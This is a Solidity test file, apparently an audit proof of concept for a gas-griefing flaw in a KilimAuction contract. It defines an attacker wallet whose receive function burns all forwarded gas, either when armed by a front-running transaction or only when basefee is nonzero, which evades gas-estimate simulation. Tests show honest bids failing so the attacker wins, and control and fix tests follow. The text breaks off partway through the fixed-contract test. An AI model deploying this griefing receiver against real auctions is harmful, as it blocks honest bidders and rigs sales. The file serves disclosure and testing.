// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import {TestBase} from "../TestBase.sol";
import {KilimAuction} from "../../src/KilimAuction.sol";
import {KilimAuctionFixed} from "./f01fix/KilimAuctionFixed.sol";

interface VmX {
    function fee(uint256) external;
    function cool(address) external;
}

/// @dev Mallory's bidding wallet. MODE 0: cheap receive. MODE 1: burn every unit of forwarded gas.
///      MODE 2: stateless switch, burn only when block.basefee != 0 (cheap in a zero-basefee simulation).
contract F01Mallory {
    address immutable owner = msg.sender;
    uint256 public mode;

    function setMode(uint256 m) external {
        require(msg.sender == owner);
        mode = m;
    }

    function bid(KilimAuction a, uint256 amount) external payable {
        require(msg.sender == owner);
        a.bid{value: amount}(amount, 0, 0);
    }

    function claimPrize(KilimAuction a, address to) external {
        require(msg.sender == owner);
        a.claimPrize(to);
    }

    function withdrawRefund(KilimAuction a, address to) external {
        require(msg.sender == owner);
        a.withdrawRefund(to);
    }

    receive() external payable {
        uint256 m = mode;
        if (m == 1 || (m == 2 && block.basefee != 0)) {
            while (true) {}
        }
    }
}

abstract contract F01Base is TestBase {
    VmX constant vmx = VmX(address(uint160(uint256(keccak256("hevm cheat code")))));
    event log_named_uint(string key, uint256 val);

    /// @dev 21000 base + calldata of bid(uint256,uint256,uint256); only used to turn an execution
    ///      estimate into a wallet-style transaction gas limit and back.
    uint256 constant INTRINSIC = 21_700;
    address constant MALLORY_EOA = address(0xBADBAD);
    uint256 constant MALLORY_BID = 2 ether;
    uint256 constant ALICE_BID = 2.2 ether;

    KilimAuction auction;
    F01Mallory mallory;
    uint64 closeBefore;

    error Sim(bool ok, uint256 used);

    function deploy(uint256 mode) internal virtual returns (address);

    function prepare(uint256 initialMode) internal {
        vmx.fee(0);
        auction = KilimAuction(deploy(initialMode));
        vm.warp(auction.startsAt());
        for (uint160 i = 1000; i < 1100; ++i) {
            vm.deal(address(i), 0.01 ether);
            vm.prank(address(i));
            auction.register();
        }
        vm.deal(BOB, 1 ether);
        vm.prank(BOB);
        auction.bid{value: 0.01 ether}(0.01 ether, 0, 0);
        // The last extension window: Mallory takes the lead through her contract.
        vm.warp(auction.endsAt() - 5 minutes);
        vm.prank(MALLORY_EOA);
        mallory = new F01Mallory();
        vm.prank(MALLORY_EOA);
        mallory.setMode(initialMode);
        vm.deal(address(mallory), MALLORY_BID);
        vm.prank(MALLORY_EOA);
        mallory.bid(auction, MALLORY_BID);
        assertEq(auction.highestBidder(), address(mallory));
        closeBefore = auction.endsAt();
        vm.deal(ALICE, 10 ether);
        vm.warp(block.timestamp + 1 minutes);
    }

    /// @dev Alice's bid with `gasLimit` execution gas, always rolled back: an eth_call.
    function sim(uint256 gasLimit) external {
        vm.prank(ALICE);
        uint256 g = gasleft();
        (bool ok,) = address(auction).call{value: ALICE_BID, gas: gasLimit}(
            abi.encodeCall(auction.bid, (ALICE_BID, 0, 0))
        );
        revert Sim(ok, g - gasleft());
    }

    function trySim(uint256 gasLimit) internal returns (bool ok, uint256 used) {
        try this.sim(gasLimit) {}
        catch (bytes memory data) {
            assembly {
                ok := mload(add(data, 36))
                used := mload(add(data, 68))
            }
        }
    }

    /// @dev eth_estimateGas: the smallest execution gas at which the bid succeeds right now.
    function estimate() internal returns (uint256 lo) {
        lo = 30_000;
        uint256 hi = 2_000_000;
        (bool ok,) = trySim(hi);
        require(ok, "bid fails even with 2M gas");
        while (hi - lo > 100) {
            uint256 mid = (lo + hi) / 2;
            (ok,) = trySim(mid);
            if (ok) hi = mid;
            else lo = mid;
        }
        lo = hi;
    }

    /// @dev Execution gas left to the bid when the wallet signs `num/den` times the estimated total.
    function walletGas(uint256 execEstimate, uint256 num, uint256 den) internal pure returns (uint256) {
        return (execEstimate + INTRINSIC) * num / den - INTRINSIC;
    }

    /// @dev Alice's real, committed bid.
    function aliceBids(uint256 gasLimit) internal returns (bool ok) {
        vm.prank(ALICE);
        (ok,) = address(auction).call{value: ALICE_BID, gas: gasLimit}(
            abi.encodeCall(auction.bid, (ALICE_BID, 0, 0))
        );
    }

    function assertMalloryStillLeads() internal view {
        assertEq(auction.highestBidder(), address(mallory));
        assertEq(auction.highestBid(), MALLORY_BID);
        assertEq(uint256(auction.endsAt()), uint256(closeBefore));
        assertEq(ALICE.balance, 10 ether);
        assertEq(auction.refunds(address(mallory)), 0);
    }
}

/// On-disk code, storage toggle: Mallory front-runs Alice's bid with setMode(1).
contract F01ToggleTest is F01Base {
    function deploy(uint256) internal override returns (address) {
        KilimAuction.Config memory c = config(address(0));
        c.reservePrice = 0.01 ether;
        return address(new KilimAuction(c));
    }

    function setUp() public {
        prepare(0);
    }

    function testF01_armedReceiverMakesEstimatedBidRunOutOfGas() public {
        uint256 cheap = estimate();
        emit log_named_uint("cheap-mode execution estimate", cheap);

        // Mallory front-runs with one small transaction.
        vm.prank(MALLORY_EOA);
        mallory.setMode(1);
        vmx.cool(address(mallory));

        uint256 g15 = walletGas(cheap, 3, 2);
        uint256 g20 = walletGas(cheap, 2, 1);
        emit log_named_uint("execution gas at 1.5x limit", g15);
        emit log_named_uint("execution gas at 2.0x limit", g20);

        assertTrue(!aliceBids(g15));
        assertMalloryStillLeads();
        assertTrue(!aliceBids(g20));
        assertMalloryStillLeads();

        uint256 armed = estimate();
        emit log_named_uint("armed-mode execution estimate (minimum that works)", armed);
        emit log_named_uint("armed/cheap total-gas ratio x100", (armed + INTRINSIC) * 100 / (cheap + INTRINSIC));
        assertTrue(armed > g20);

        // Nobody else bids in time: Mallory wins at her own price.
        vm.warp(closeBefore);
        auction.settle();
        vm.prank(MALLORY_EOA);
        mallory.claimPrize(auction, MALLORY_EOA);
        assertEq(auction.collection().ownerOf(auction.collection().MASTERPIECE_ID()), MALLORY_EOA);
        assertEq(auction.proceedsDue(), MALLORY_BID);
    }

    /// Control: the same 1.5x limit succeeds when the receiver is not armed, so the toggle alone
    /// decides the outcome.
    function testF01_control_sameLimitSucceedsWhenDisarmed() public {
        uint256 cheap = estimate();
        assertTrue(aliceBids(walletGas(cheap, 3, 2)));
        assertEq(auction.highestBidder(), ALICE);
        assertEq(address(mallory).balance, MALLORY_BID);
    }

    /// Control: nothing is stolen. With enough gas the armed bid goes through and the refund is deferred.
    function testF01_control_ampleGasDefersRefund() public {
        vm.prank(MALLORY_EOA);
        mallory.setMode(1);
        vmx.cool(address(mallory));
        vm.prank(ALICE);
        uint256 g = gasleft();
        auction.bid{value: ALICE_BID}(ALICE_BID, 0, 0);
        emit log_named_uint("armed bid execution gas with ample limit", g - gasleft());
        assertEq(auction.highestBidder(), ALICE);
        assertEq(auction.refunds(address(mallory)), MALLORY_BID);
        assertEq(address(auction).balance, auction.liabilities());
    }
}

/// On-disk code, no arming transaction at all: the receiver burns only when block.basefee != 0.
contract F01BasefeeTest is F01Base {
    function deploy(uint256) internal override returns (address) {
        KilimAuction.Config memory c = config(address(0));
        c.reservePrice = 0.01 ether;
        return address(new KilimAuction(c));
    }

    function setUp() public {
        prepare(2);
    }

    function testF01_statelessSwitchPassesSimulationFailsOnChain() public {
        vmx.fee(0); // an eth_estimateGas / eth_call that leaves gas price unset
        uint256 cheap = estimate();
        emit log_named_uint("zero-basefee simulation estimate", cheap);
        vmx.fee(10 gwei); // inclusion in a real block
        uint256 g15 = walletGas(cheap, 3, 2);
        assertTrue(!aliceBids(g15));
        assertMalloryStillLeads();
        uint256 real = estimate();
        emit log_named_uint("real-basefee minimum execution gas", real);
        assertTrue(real > g15);
    }
}

/// The suggested floor applied to a copy of the on-disk sources: no estimate can be undercut.
contract F01FixedTest is F01Base {
    function deploy(uint256) internal override returns (address) {
        KilimAuctionFixed.Config memory c = KilimAuctionFixed.Config({
            paymentToken: address(0),
            treasury: TREASURY,
            collectionOwner: PAGE_OWNER,
            startsAt: uint64(block.timestamp + 1 hours),
            duration: 22 hours,
